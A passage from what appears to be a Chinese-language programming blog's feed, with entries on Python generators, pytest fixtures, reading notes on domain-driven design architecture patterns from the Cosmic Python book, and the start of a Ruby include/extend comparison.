title="取返回值"></a>取返回值</h2><p>正常情况下，迭代器是无法获取到返回值的，但是可以通过两种方式获取</p><ol><li>使用<code>StopIteration</code>异常</li><li>使用类，然后取类的变量</li></ol><h3 id="使用StopIteration"><a href="#使用StopIteration" class="headerlink" title="使用StopIteration"></a>使用<code>StopIteration</code></h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span>(<span class="hljs-params"><span class="hljs-built_in">max</span></span>):</span></span><span class="line">  n, a, b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><span class="line">  <span class="hljs-keyword">while</span> n &lt; <span class="hljs-built_in">max</span>:</span><span class="line">    <span class="hljs-keyword">yield</span> b</span><span class="line">    a, b = b, a + b</span><span class="line">    n = n + <span class="hljs-number">1</span></span><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;done&#x27;</span></span><span class="line"><span class="hljs-comment"># 捕获Generator的返回值</span></span><span class="line">g = fib(<span class="hljs-number">6</span>)</span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line">  <span class="hljs-keyword">try</span>:</span><span class="line">    x=<span class="hljs-built_in">next</span>(g)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g=&#x27;</span>,x)</span><span class="line">  <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> e:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Generrator return value:&#x27;</span>, e.value)</span><span class="line">    <span class="hljs-keyword">break</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pytest</title>
      <link href="/2021/10/13/python-pytest/"/>
      <url>/2021/10/13/python-pytest/</url>
      
        <content type="html"><![CDATA[<p>pytest 是强大的测试框架</p><p>当函数使用<code>test_</code>为开头的时候，就会在执行测试的时候进行测试。</p><p>执行命令为：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-nginx codeBlockLines"><span class="line"><span class="hljs-attribute">pytest</span> -v -s test_file.py</span></code></pre></div></div><h2 id="conftest-py"><a href="#conftest-py" class="headerlink" title="conftest.py"></a>conftest.py</h2><p><code>conftest.py</code>的特点:</p><ol><li>conftest.py与运行的用例要在同一个pakage下，并且有__init__.py文件</li><li>不需要import导入 conftest.py，pytest用例会自动识别该文件，放到项目的根目录下就可以全局目录调用了，如果放到某个package下，那就在该package内有效，可有多个conftest.py</li><li>conftest.py配置脚本名称是固定的，不能改名称</li><li>conftest.py文件不能被其他文件导入</li><li>所有同目录测试文件运行前都会执行conftest.py文件</li></ol><p>在conftest.py中将会用到<code>@pytest.fixture</code>装饰器</p><h2 id="fixture"><a href="#fixture" class="headerlink" title="fixture"></a>fixture</h2><p>fixture函数如下：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-lasso codeBlockLines"><span class="line">fixture（scope=<span class="hljs-string">&#x27;function&#x27;</span>，<span class="hljs-keyword">params</span>=<span class="hljs-literal">None</span>，autouse=<span class="hljs-literal">False</span>，ids=<span class="hljs-literal">None</span>，name=<span class="hljs-literal">None</span>）</span></code></pre></div></div><ul><li>scope参数可以控制fixture的作用范围，scope：有四个级别参数”function”（默认），”class”，”module”，”session</li><li>params：一个可选的参数列表，每个参数执行一遍，相当于for循环</li><li>autouse：如果True，则为所有测试激活fixture func可以看到它。</li><li>ids：每个字符串id的列表，每个字符串对应于params这样他们就是测试ID的一部分。如果没有提供ID它们将从params自动生成</li><li>name：fixture的名称。</li></ul><p>scope作用范围： session&gt;module&gt;class&gt;function</p><ul><li>function：每一个函数或方法都会调用</li><li>class：每一个类调用一次，一个类中可以有多个方法</li><li>module：每一个.py文件调用一次，该文件内又有多个function和class</li><li>session：是多个文件调用一次，可以跨.py文件调用，每个.py文件就是module</li></ul><h2 id="pytest-ini"><a href="#pytest-ini" class="headerlink" title="pytest.ini"></a>pytest.ini</h2><p>todo</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 领域驱动编程 笔记</title>
      <link href="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cosmicpython.com/book/introduction.html">Python软件设计</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>什么是DIP(The Dependency Inversion Principle 依赖反转原则)， 他的定义是什么</p><blockquote><p>一、高级模块不应该依赖于低级模块，两者都应该依赖于抽象。</p><p>二、抽象不应该依赖于细节，相反，细节应该依赖于抽象。</p></blockquote><p>所以通常的模式是业务逻辑 -&gt; 中间层 -&gt; 数据逻辑</p><h2 id="第1部分-构建支持领域建模的体系结构"><a href="#第1部分-构建支持领域建模的体系结构" class="headerlink" title="第1部分: 构建支持领域建模的体系结构"></a>第1部分: 构建支持领域建模的体系结构</h2><blockquote><p>我们发现，许多开发人员在被要求设计一个新系统时，会立即开始构建一个数据库模式，而对象模型则是事后才想到的。这就是一切开始出错的地方。相反，行为应该放在第一位，并驱动我们的存储需求。毕竟，我们的客户并不关心数据模型。他们关心系统做什么; 否则他们只会使用电子表格。</p></blockquote><p>通过 TDD构建富对象模型,提出了四个关键的设计模式:</p><ul><li>仓库模式，对持久存储概念的抽象</li><li>服务层模式来清楚地定义我们的用例开始和结束的位置</li><li>提供原子操作的工作单元模式</li><li>加强数据完整性的聚合模式</li></ul><img src="c42a133ff98a6e6416513c6244ba590f.png" alt="1.png" style="zoom:50%;" /><img src="b75234a13d34a59dbe15193d61bbe56e.png" alt="2.png" style="zoom:50%;" /><h3 id="1-域建模-Domain-Modeling"><a href="#1-域建模-Domain-Modeling" class="headerlink" title="1. 域建模 Domain Modeling"></a>1. 域建模 Domain Modeling</h3><blockquote><p> 单元测试的名称描述了我们希望从系统中看到的行为，我们使用的类和变量的名称取自业务术语。我们可以向非技术人员同事展示这段代码，他们会同意这正确地描述了系统的行为。</p></blockquote><p>Domain Model 也就是核心模型，是在剥离了数据细节，专注于处理业务逻辑的地方，这里也是<strong>最常被修改</strong>的地方。</p><p>要清楚，剥离了数据后，所有的逻辑都是在核心模型里面进行的。</p><p>那么就要思考一些问题。</p><ol><li>在一开始设计的时候，首先就是对这一块代码的试试，并且是以测试驱动的，那么数据怎么来？ 怎么测试</li><li>哪些是真正的业务逻辑，哪些是底层逻辑？</li></ol><p>在书中给出了使用<code>@dataclass</code>来建立一个<code>Value Object</code>的方式来分配了一个不可变动的数据容器。</p><p>在Domain Model中需要保持良好的注解习惯，方便阅读。</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/b694248664d2cf393319cabaff43e9fc.png" alt="8.png"></p><h3 id="2-库模式-Repository-Pattern"><a href="#2-库模式-Repository-Pattern" class="headerlink" title="2. 库模式 Repository Pattern"></a>2. 库模式 Repository Pattern</h3><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/bdd1c063c41bb94ab7759fe185b52529.png" alt="3.png"></p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/275344b3f8510c070a600196dff79e86.png" alt="4.png"></p><p>如上所示的模型，领域模型不依赖于数据层，而是反过来的依赖关系。</p><p>这种设计模式叫做依赖反转原则（DIP）。</p><p>还有一个叫做控制反转（IoC），说的是原本A控制B的流程变成了B由外部容器控制。</p><p>那么这样就需要解决一个问题，如何让Domain调用数据层的内容。所以就有了仓库这样的适配器。</p><p>按照我目前的理解，适配器其中一个作用就是将存在DB中的Domain实例提取出来，然后给到Domain Model中执行。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># load all batches from the DB</span></span><span class="line"> batches = session.query(Batch).<span class="hljs-built_in">all</span>()</span><span class="line"></br></span><span class="line"> <span class="hljs-comment"># call our domain service</span></span><span class="line"> allocate(line, batches)</span></code></pre></div></div><blockquote><p>我们坚持定义接口是我们程序和我们抽象出来的东西之间有一个约定。对于调用方并不关心一个方法究竟是怎么实现的。我们只想知道这个方法能给我们带来什么。</p></blockquote><ul><li>其中用到了数据库的ORM技术，即把表和类关联起来，重点是session和mapper。</li></ul><p>在内存中建立数据库的方法是：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">in_memory_db</span>():</span></span><span class="line">    engine = create_engine(<span class="hljs-string">&quot;sqlite:///:memory:&quot;</span>)</span><span class="line">    metadata.create_all(engine)</span><span class="line">    <span class="hljs-keyword">return</span> engine</span></code></pre></div></div><p>仓库模式的一个优势就是可以方便的使用假数据做测试，因为可以在test中建立一个FakeRepository仓库来模拟测试。</p><h2 id="3-关于耦合和抽象的概念"><a href="#3-关于耦合和抽象的概念" class="headerlink" title="3. 关于耦合和抽象的概念"></a>3. 关于耦合和抽象的概念</h2><blockquote><p>当我们必须从基本原则出发来解决问题时，我们通常会尝试编写一个简单的实现，然后重构以获得更好的设计。我们将在整本书中使用这种方法，因为这是我们在现实世界中编写代码的方式: 从问题的最小部分的解决方案开始，然后迭代使解决方案更加丰富和更好地设计。</p></blockquote><p>我们将在这里运用一个技巧，我们将在本书后面大规模运用这个技巧。我们要把我们<strong>想做的</strong>和<strong>怎么做</strong>的区分开来。</p><p>一般来说，顶级函数就是在输入后将复杂的逻辑交到低级函数，低级函数经过复杂处理得到如何做后，交给顶级函数，然后顶级函数根据怎么做来执行任务。</p><p>这样一来，测试的时候，做低级函数的测试就更加方便。</p><h2 id="4-服务层"><a href="#4-服务层" class="headerlink" title="4. 服务层"></a>4. 服务层</h2><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/c8149ce406c5dad9eae3b55d1b76e506.png" alt="5.png"></p><p>典型的服务层功能有类似的步骤:</p><ol><li>从repository中提取对象</li><li>对请求进行检查或者断言</li><li>执行domain模型中的函数</li><li>当一切正常，保存或者更新</li></ol><p>为什么要加入这一层？ </p><ol><li>因为在没加入这一层的时候，做e2e的测试复杂。</li><li>加入这一层后，展示层只需要负责简单的调用逻辑，而服务层则负责将所需内容编排起来。</li></ol><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/b9feffbb61514fcd5859e9101e1794ad.png" alt="6.png"></p><h2 id="TDD-在高速档和低速档"><a href="#TDD-在高速档和低速档" class="headerlink" title="TDD 在高速档和低速档"></a>TDD 在高速档和低速档</h2><blockquote><p>测试应该帮助我们大胆地改变我们的系统，但是我们经常看到团队针对他们的领域模型编写了太多的测试。当他们改变他们的代码库并发现他们需要更新数十甚至数百个单元测试时，这会导致问题。</p></blockquote><blockquote><p>我们用的比喻是“换档”。出发时，自行车需要挂低挡，这样才能克服惯性。一旦我们出发并开始跑步，我们可以通过换上高速档来提高速度和效率; 但是如果我们突然遇到陡峭的山坡或者因为危险而被迫减速，我们会再次降到低速档，直到我们可以再次加速。</p></blockquote><p>也就是说在当需要理清楚域模型的特性的时候，使用低速挡来前进。当域模型比较稳定，需要添加新的特性的时候，那么就用高速档，在服务层进行测试。</p><p>所谓的依赖关系，就是要引入并且手动的实例化对象。</p><blockquote><p>一般来说，如果您发现自己需要在<strong>服务层测试</strong>中直接执行域层的工作，这可能表明您的服务层是不完整的</p></blockquote><p><strong>每个测试倾向于覆盖一个特性的一个代码路径</strong></p><blockquote><p>理想情况下，您的应用程序的结构应该使得所有冒泡到入口点的错误(例如，Flask)都以同样的方式处理。</p></blockquote><p>  用原语而不是域对象来表示服务层。</p><h2 id="工作单元-Unit-of-Work"><a href="#工作单元-Unit-of-Work" class="headerlink" title="工作单元 Unit of Work"></a>工作单元 Unit of Work</h2><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/0df1c20f1443178b71459560515c9cf5.png" alt="7.png"></p><p>工作单元放在服务层，解决的问题是在<code>Services</code>中直接调用仓库还是耦合度较高，并且不易于对DB进行维护。</p><p>使用了UoW后，可以通过<code>with uow</code>的方式对上下文进行处理。<code>__enter</code>和<code>__exit__</code>方法</p><p>另外，将原本在server上依赖的<code>Repository</code>转移到了UoW上，Server只需要获得UoW就可以了。</p><p>UoW还能提供遇到异常时候的隐式处理模式：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractUnitOfWork</span>(<span class="hljs-params">abc.ABC</span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> self</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span>(<span class="hljs-params">self, exc_type, exc_value, traceback</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> exc_type <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><span class="line">            self.commit()  <span class="hljs-comment">#(1)</span></span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            self.rollback()  <span class="hljs-comment">#(2)</span></span></code></pre></div></div><h2 id="聚合和一致性边界"><a href="#聚合和一致性边界" class="headerlink" title="聚合和一致性边界"></a>聚合和一致性边界</h2><blockquote><p>事实上，大量的业务流程都是通过电子邮件手工来回发送电子表格来实现的。这种“ CSV over SMTP”体系结构的初始复杂度较低，但由于难以应用逻辑和维护一致性，因此往往不能很好地进行伸缩。</p></blockquote><p>聚合、有界上下文和微服务</p><blockquote><p>从本质上讲，这是对试图将整个企业纳入单一模式的反击。顾客这个词对于销售、客户服务、后勤、支持等等方面的人来说意味着不同的东西。在一个上下文中需要的属性在另一个上下文中是不相关的; 更有害的是，同名的概念在不同的上下文中可能有完全不同的含义。与其试图构建一个单一的模型(或类或数据库)来捕获所有的用例，不如使用多个模型，围绕每个上下文划定界限，并明确地处理不同上下文之间的转换。</p></blockquote><p>也就是所，通过对上下文的限制，确定每一个聚合的服务对象确保是最小单元的,域模型应该只包含执行计算所需的数据。例如：</p><p><code>Product(sku, batches)</code> 和 <code>Product(sku, description, price, image_url, dimensions, etc…​)</code></p><p>聚合是进入域模型的入口点</p><p>聚合的任务是能够在不变量应用于一组相关对象时管理有关不变量的业务规则。检查其职权范围内的对象是否相互一致，是否符合我们的规则，并拒绝可能违反规则的更改，这是总体的工作。</p><h2 id="事件和消息总线"><a href="#事件和消息总线" class="headerlink" title="事件和消息总线"></a>事件和消息总线</h2><p>举例：当需要使用<code>send_mail</code>来通告的时候，这个方法放在哪里呢？ 可以想到放在现有的哪个位置都是不好的，因为违反了单一责任原则。</p><p>我们的模型不会关注电子邮件，而是负责记录事件。我们将使用消息总线来响应事件并调用新的操作。</p><p>messagebus属于服务层。</p><p>具体的操作就是在<code>repository</code>中添加要观察的类，然后在<code>uow</code>要<code>commit</code>的时候将所有的event传递给messagebus</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handle</span>(<span class="hljs-params">event: events.Event</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> handler <span class="hljs-keyword">in</span> HANDLERS[<span class="hljs-built_in">type</span>(event)]:</span><span class="line">        handler(event)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_out_of_stock_notification</span>(<span class="hljs-params">event: events.OutOfStock</span>):</span></span><span class="line">    email.send_mail(</span><span class="line">        <span class="hljs-string">&quot;stock@made.com&quot;</span>,</span><span class="line">        <span class="hljs-string">f&quot;Out of stock for <span class="hljs-subst">&#123;event.sku&#125;</span>&quot;</span>,</span><span class="line">    )</span><span class="line"></br></span><span class="line"></br></span><span class="line">HANDLERS = &#123;</span><span class="line">    events.OutOfStock: [send_out_of_stock_notification],</span><span class="line">&#125;  <span class="hljs-comment"># type: <span class="hljs-type">Dict</span>[<span class="hljs-type">Type</span>[events.Event], <span class="hljs-type">List</span>[<span class="hljs-type">Callable</span>]]</span></span></code></pre></div></div><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/a411fa45e57f664059c29e99e529475a.png" alt="9.png"></p><h2 id="Going-to-Towm-on-the-Message-Bus"><a href="#Going-to-Towm-on-the-Message-Bus" class="headerlink" title="Going to Towm on the Message Bus"></a>Going to Towm on the Message Bus</h2><p>这一章将API调用和内部消息都统一起来了放在了前端。所有API的调用都是以消息的方式进行的。</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/ddfee420274300570723a328cc8e46dc.png" alt="10.png"></p><p>这样做也导致了整个串联关系没有了实体，只能通过日志来进行调试。</p><p>下图是时序图，在调用了BatchQuantityChanged事件后，在<code>messagebus.py</code>中将消息转化成了函数调用，去执行<code>domain</code>中的内容，然后<code>domain</code>又激发了<code>AllocationRequired</code>消息，<code>handler</code>接受到了后继续执行。</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/6eeb52e368a4a9e5d0268125d81637e5.png" alt="11.png"></p><p>另外在做测试的时候，可以使用<code>FakeMessageBus</code>来进行。</p><h2 id="命令和命令处理程序"><a href="#命令和命令处理程序" class="headerlink" title="命令和命令处理程序"></a>命令和命令处理程序</h2><p>将<code>Event</code>和<code>Command</code>分开</p><p>Event：</p><ol><li>事件传递给可以委托给每个事件的多个处理程序的调度程序。</li><li>它捕获并记录错误，但不允许错误中断消息处理。</li><li>没有返回值</li></ol><p>Command：</p><ol><li> 命令调度程序期望每个命令只有一个处理程序。</li><li> 如果出现任何错误，它们很快就会失败，并且会冒出来。</li></ol><p>Event 命名是过去时，而Command是现在时。</p><p>区别对待Event和Command有助于帮助我们理解哪些事是必须成功的，哪些是可以失败的。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> tenacity <span class="hljs-keyword">import</span> Retrying, RetryError, stop_after_attempt, wait_exponential <span class="hljs-comment">#(1)</span></span><span class="line"></br></span><span class="line">...</span><span class="line"></br></span><span class="line"></br></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    event: events.Event,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    queue: <span class="hljs-type">List</span>[Message],</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    uow: unit_of_work.AbstractUnitOfWork,</span></span></span><span class="line"></br>):</span></span><span class="line">    <span class="hljs-keyword">for</span> handler <span class="hljs-keyword">in</span> EVENT_HANDLERS[<span class="hljs-built_in">type</span>(event)]:</span><span class="line">        <span class="hljs-keyword">try</span>:</span><span class="line">            <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> Retrying(  <span class="hljs-comment">#(2)</span></span><span class="line">                stop=stop_after_attempt(<span class="hljs-number">3</span>),</span><span class="line">                wait=wait_exponential()</span><span class="line">            ):</span><span class="line"></br></span><span class="line">                <span class="hljs-keyword">with</span> attempt:</span><span class="line">                    logger.debug(<span class="hljs-string">&quot;handling event %s with handler %s&quot;</span>, event, handler)</span><span class="line">                    handler(event, uow=uow)</span><span class="line">                    queue.extend(uow.collect_new_events())</span><span class="line">        <span class="hljs-keyword">except</span> RetryError <span class="hljs-keyword">as</span> retry_failure:</span><span class="line">            logger.error(</span><span class="line">                <span class="hljs-string">&quot;Failed to handle event %s times, giving up!&quot;</span>,</span><span class="line">                retry_failure.last_attempt.attempt_number</span><span class="line">            )</span><span class="line">            <span class="hljs-keyword">continue</span></span></code></pre></div></div><p>上面的重试方法使event有一定的韧性。</p><h2 id="Event-Driven-架构"><a href="#Event-Driven-架构" class="headerlink" title="Event-Driven 架构"></a>Event-Driven 架构</h2><p>事件驱动架构，当遇到需要与其他软件系统进行协作的时候，直接调用软件的方法相当于是强耦合了，这里给出的方式是通过异步消息来串联，使用的工具是<code>Redis</code></p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/663a2c676ac004f27f9c8078fa5505cb.png" alt="12.png"></p><h2 id="命令查询责任分离（CQRS）"><a href="#命令查询责任分离（CQRS）" class="headerlink" title="命令查询责任分离（CQRS）"></a>命令查询责任分离（CQRS）</h2><p>command-query Responsibility separation (CQRS) </p><p>将命令与查询的责任分开。</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/22030bbf641c076f4d70371302493317.png" alt="13.png"></p><p>单独开辟一个<code>view.py</code>层作为对外的读取接口，并直接调用SQL语句进行查询，查询的是<code>allocations_view</code>表。</p><p>书中加入了<code>event.Allocated</code>事件方法<code>handlers.add_allocation_to_read_model</code>，将单独的给DB中<code>allocations_view</code>表添加可读信息。这样将外部的可读与可写的分开了。</p><h2 id="注入依赖"><a href="#注入依赖" class="headerlink" title="注入依赖"></a>注入依赖</h2><p>所谓的注入依赖，就是将原本在方法内完成的实例化由第三方外部完成，然后传递进来的就只是实例即可。</p><p>原先的MessageBus需要在内部进行组装，而这章加入了引导模块(bootstrap)。并在其中进行组装，使用lambda函数将函数预先封装好。后面直接调用，而不用获取<code>uow</code>等上下文环境。</p><p>加入了引导模块的好处是可以根据实际的情况进行拼装，比如测试还是生产。</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/08c051419609a2a668e0183d4f194abf.png" alt="14.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><blockquote><p>在本书的开头，我们说过一个大泥球的主要特征是同质性: 系统的每个部分看起来都是一样的，因为我们<strong>没有明确每个部分的责任</strong>。为了解决这个问题，我们需要开始划分责任并引入明确的界限。我们可以做的第一件事情是开始构建服务层(协作系统的领域)。</p></blockquote><blockquote><p>前面我们说过，我们希望<strong>避免代码中混杂无关的细节</strong>。特别是，我们不希望在域模型中进行防御性编码。相反，我们希望确保在域模型或用例处理程序看到请求之前，请求已知是有效的。这有助于我们的代码在长期内保持整洁和可维护性。我们有时将此称为在系统边缘验证。</p></blockquote><p>验证是验证什么？句法、语义和语用（syntax, semantics, and pragmatics）。</p><p>在系统边缘进行验证。</p><h3 id="语法的验证"><a href="#语法的验证" class="headerlink" title="语法的验证"></a>语法的验证</h3><p>通过<code>schema</code>模块对<code>command.py</code>模块中的dataclass进行验证。</p><p>这样就可以保证在api和业务核心上的代码干净。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> schema <span class="hljs-keyword">import</span> And, Schema, Use</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@dataclass</span></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Allocate</span>(<span class="hljs-params">Command</span>):</span></span><span class="line"></br></span><span class="line">    _schema = Schema(&#123;  <span class="hljs-comment">#(1)</span></span><span class="line">        <span class="hljs-string">&#x27;orderid&#x27;</span>: <span class="hljs-built_in">int</span>,</span><span class="line">         sku: <span class="hljs-built_in">str</span>,</span><span class="line">         qty: And(Use(<span class="hljs-built_in">int</span>), <span class="hljs-keyword">lambda</span> n: n &gt; <span class="hljs-number">0</span>)</span><span class="line">     &#125;, ignore_extra_keys=<span class="hljs-literal">True</span>)</span><span class="line"></br></span><span class="line">    orderid: <span class="hljs-built_in">str</span></span><span class="line">    sku: <span class="hljs-built_in">str</span></span><span class="line">    qty: <span class="hljs-built_in">int</span></span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @classmethod</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">from_json</span>(<span class="hljs-params">cls, data</span>):</span>  <span class="hljs-comment">#(2)</span></span><span class="line">       data = json.loads(data)</span><span class="line">       <span class="hljs-keyword">return</span> cls(**_schema.validate(data))</span></code></pre></div></div><p>这样做有个弊端就是要声明两次。</p><h3 id="语义验证"><a href="#语义验证" class="headerlink" title="语义验证"></a>语义验证</h3><p>将规则验证单独提取出来，开辟单独的Exception，并在MessageBus中捕获</p><h3 id="语用"><a href="#语用" class="headerlink" title="语用"></a>语用</h3><p>语用就是结合上下文，书中没有给出示例。</p><blockquote><p> <strong>验证语法可以发生在消息类上，验证语义可以发生在服务层或消息总线上，验证语用属于域模型。</strong></p></blockquote><p>全书的最终结构：</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/e34b6be92adfc2b86ffebbb26e802463.png" alt="15.png"></p><p><img src="http://121.196.175.55:9999/png/RLDBJiCm4Dtx5AEke58v0AeGAQq44eX2LRf8A-GaGmbDxCXsIYleZbjm3pQLE0s8Q-1FaXfHRsBFl9bvysPoAXKLgimp-Dc-VMq_ljy_YKfLXj1kDvPscv22nWiwHsYDK2pJ62_f6aKBNWZe4rwXbDhRA-KCg8IebDQklz0vWV2SiYH38MVM6lEyu0oPWjQOfGhu0qouMDJ9RC8WaahGMC6OJsnA6fNykV7R5tHVZo0StLm65cMT6yUdAMZAkz0D8M4mlD0MRJB4Zk6Cvxa6IX8EbffEp9aiSnHx8LvmsEDS6Nh5R6_a7__kNcSbdfX1GWkbUTQzUzBSOi5bghX8KUwNfa6iAuM4DdWIcQUdaGVtfRh599LJPlkOic4PPQbyDAtebCBu70nLF3CQEkKxLbPRRpS0r_o_MbwxVPxJb3LR4ypd0kTKeHrJE61wyofozSFblADPYN0TFM6iQh_XMzsh8Lb-jQ8ceoj7I48LZQZ4gkx18VHxTXy6AmrbD8DgVw4d-ABg7LVtkREItTNH-JjptztjT2hHo3yXRAmkhCyfiaJ_Sxy0" alt="组件图" title="组件图"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ruby 中 include extend require load 的区别</title>
      <link href="/2021/10/09/ruby-%E4%B8%AD-include-extend-require-load-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2021/10/09/ruby-%E4%B8%AD-include-extend-require-load-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>include 相当于将模块定义的方法和常量插入到类中，mixin的能力可以实现多继承。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">Log</span> </span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">class_type</span></span></span><span class="line">    <span class="hljs-string">&quot;This class is of type: <span class="hljs-subst">#&#123;<span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>&#125;</span>&quot;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> </span></span><span class="line">  <span class="hljs-keyword">include</span> Log </span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">tc = TestClass.new.class_type</span><span class="line">puts tc <span class="hljs-comment">#This class is of type: TestClass</span></span></code></pre></div></div><h2 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h2><p>extend 用于添加类方法而不是include的实例方法。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span 